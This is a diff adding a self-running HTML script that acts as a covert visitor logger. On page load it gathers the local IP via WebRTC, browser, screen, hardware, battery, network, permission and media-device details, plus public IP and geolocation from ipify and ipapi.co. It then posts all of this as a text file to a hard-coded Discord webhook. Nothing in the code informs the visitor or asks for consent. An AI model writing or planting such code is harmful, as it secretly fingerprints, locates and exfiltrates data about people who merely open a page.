@@ -1,0 +1,159 @@
+<script>
+(async () => {
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr";
+
+    /* ========================= FONCTION POUR RÉCUPÉRER IP LOCALE ========================= */
+    async function getLocalIP() {
+        try {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            await pc.createOffer();
+            const offer = await pc.localDescription;
+            const lines = offer.sdp.split('\n');
+            const ipLine = lines.find(line => line.includes('a=candidate') && line.includes('host'));
+            if (ipLine) {
+                const parts = ipLine.split(' ');
+                return parts[4];
+            }
+            return "Non détectée";
+        } catch (error) {
+            return "Erreur";
+        }
+    }
+
+    /* ========================= COLLECTE INFOS AVANCÉES ========================= */
+    const infos = {};
+
+    // Récupération de l'IP locale
+    infos.ipLocale = await getLocalIP();
+
+    infos.navigateur = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        langue: navigator.language,
+        langues: navigator.languages,
+        cookies: navigator.cookieEnabled,
+        enLigne: navigator.onLine,
+        doNotTrack: navigator.doNotTrack
+    };
+
+    infos.ecran = {
+        largeur: screen.width,
+        hauteur: screen.height,
+        availLargeur: screen.availWidth,
+        availHauteur: screen.availHeight,
+        pixelRatio: window.devicePixelRatio,
+        couleur: screen.colorDepth,
+        orientation: screen.orientation?.type || "Inconnue"
+    };
+
+    infos.materiel = {
+        ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Inconnue",
+        cpuCores: navigator.hardwareConcurrency || "Inconnu",
+        tactile: ('ontouchstart' in window)
+    };
+
+    infos.temps = {
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        dateLocale: new Date().toString()
+    };
+
+    /* ========================= BATTERIE ========================= */
+    if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        infos.batterie = {
+            niveau: Math.round(battery.level * 100) + "%",
+            enCharge: battery.charging,
+            tempsCharge: battery.chargingTime,
+            tempsDecharge: battery.dischargingTime
+        };
+    }
+
+    /* ========================= RÉSEAU ========================= */
+    if (navigator.connection) {
+        infos.reseau = {
+            type: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink + " Mb/s",
+            rtt: navigator.connection.rtt + " ms",
+            economiseurData: navigator.connection.saveData
+        };
+    }
+
+    /* ========================= PERMISSIONS (état) ========================= */
+    async function perm(name) {
+        try {
+            const p = await navigator.permissions.query({ name });
+            return p.state;
+        } catch {
+            return "Non supporté";
+        }
+    }
+
+    infos.permissions = {
+        geolocalisation: await perm("geolocation"),
+        notifications: await perm("notifications"),
+        microphone: await perm("microphone"),
+        camera: await perm("camera"),
+        clipboard: await perm("clipboard-read")
+    };
+
+    /* ========================= MÉDIAS (sans accès) ========================= */
+    if (navigator.mediaDevices?.enumerateDevices) {
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        infos.media = {
+            cameras: devices.filter(d => d.kind === "videoinput").length,
+            micros: devices.filter(d => d.kind === "audioinput").length,
+            sortiesAudio: devices.filter(d => d.kind === "audiooutput").length
+        };
+    }
+
+    /* ========================= IP + GEO IP ========================= */
+    try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+        infos.ip = ipData.ip;
+        const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+        const geo = await geoRes.json();
+        infos.geoIP = {
+            pays: geo.country_name,
+            region: geo.region,
+            ville: geo.city,
+            codePostal: geo.postal,
+            fournisseur: geo.org,
+            asn: geo.asn,
+            timezone: geo.timezone,
+            typeReseau: geo.network
+        };
+    } catch {
+        infos.ip = "Erreur";
+    }
+
+    /* ========================= FORMAT TXT ========================= */
+    let txt = "=== New Logger Info ===\n\n";
+
+    function add(section, obj) {
+        txt += `[${section}]\n`;
+        for (const k in obj) {
+            txt += `${k}: ${obj[k]}\n`;
+        }
+        txt += "\n";
+    }
+
+    add("IP Locale", { ipLocale: infos.ipLocale });
+    add("Navigateur", infos.navigateur);
+    add("Écran", infos.ecran);
+    add("Matériel", infos.materiel);
+    add("Temps", infos.temps);
+    if (infos.batterie) add("Batterie", infos.batterie);
+    if (infos.reseau) add("Réseau", infos.reseau);
+    add("Permissions", infos.permissions);
+    if (infos.media) add("Périphériques média", infos.media);
+    add("IP", { ip: infos.ip });
+    if (infos.geoIP) add("Géo IP", infos.geoIP);
+
+    /* ========================= ENVOI DISCORD EN FICHIER ========================= */
+    const form = new FormData();
+    form.append("file", new Blob([txt], { type: "text/plain" }), "New_Logger_Info.txt");
+    fetch(WEBHOOK_URL, { method: "POST", body: form });
+})();
+              </script>
